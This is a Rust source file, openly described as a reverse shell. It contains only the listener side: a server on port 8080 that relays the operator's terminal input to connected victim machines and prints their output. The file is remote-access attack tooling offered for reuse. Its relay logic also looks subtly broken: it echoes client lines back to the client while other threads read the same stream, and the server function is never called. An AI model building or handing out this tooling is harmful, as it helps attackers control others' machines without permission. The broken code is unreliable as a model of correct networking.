/*

A reverse shell written in Rust.
Copyright (C) 2022-2023 simonfalke, Sherlock Holmes, Admiral Canaris

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.

*/


pub mod server {
	use std::io::{BufRead, BufReader, Write, Read};
	use std::net::{TcpListener, TcpStream};
	use std::thread;

	fn handle_client(mut stream: TcpStream) {
		let mut input = String::new();
		let mut reader = BufReader::new(stream.try_clone().unwrap());

		let mut stdout_stream = stream.try_clone().unwrap();
		let mut stderr_stream = stream.try_clone().unwrap();
		let mut stdin_stream = stream.try_clone().unwrap();

		let stdout_thread = thread::spawn(move || {
			let mut stdout = std::io::stdout();
			let mut buf = [0u8; 1024];
			loop {
				match stdout_stream.read(&mut buf) {
					Ok(0) => break,
					Ok(n) => {
						stdout.write_all(&buf[..n]).unwrap();
						stdout.flush().unwrap();
					}
					Err(_) => break,
				}
			}
		});

		let stderr_thread = thread::spawn(move || {
			let mut stderr = std::io::stderr();
			let mut buf = [0u8; 1024];
			loop {
				match stderr_stream.read(&mut buf) {
					Ok(0) => break,
					Ok(n) => {
						stderr.write_all(&buf[..n]).unwrap();
						stderr.flush().unwrap();
					}
					Err(_) => break,
				}
			}
		});

		let stdin_thread = thread::spawn(move || {
			let mut stdin = std::io::stdin();
			let mut buf = [0u8; 1024];
			loop {
				match stdin.read(&mut buf) {
					Ok(0) => break,
					Ok(n) => {
						stdin_stream.write_all(&buf[..n]).unwrap();
						stdin_stream.flush().unwrap();
					}
					Err(_) => break,
				}
			}
		});

		loop {
			match reader.read_line(&mut input) {
				Ok(n) if n > 0 => {
					stream.write_all(input.as_bytes()).unwrap();
					input.clear();
				}
				Ok(_) | Err(_) => {
					println!("Client disconnected.");
					break;
				}
			}
		}

		stdout_thread.join().unwrap();
		stderr_thread.join().unwrap();
		stdin_thread.join().unwrap();
	}

	fn run_server() {
		let listener = TcpListener::bind("0.0.0.0:8080").unwrap();

		println!("Server listening on port 8080");

		for stream in listener.incoming() {
			match stream {
				Ok(stream) => {
					println!("New client connected: {:?}", stream.peer_addr().unwrap());
					thread::spawn(move || handle_client(stream));
				}
				Err(e) => {
					println!("Error: {}", e);
				}
			}
		}
	}
}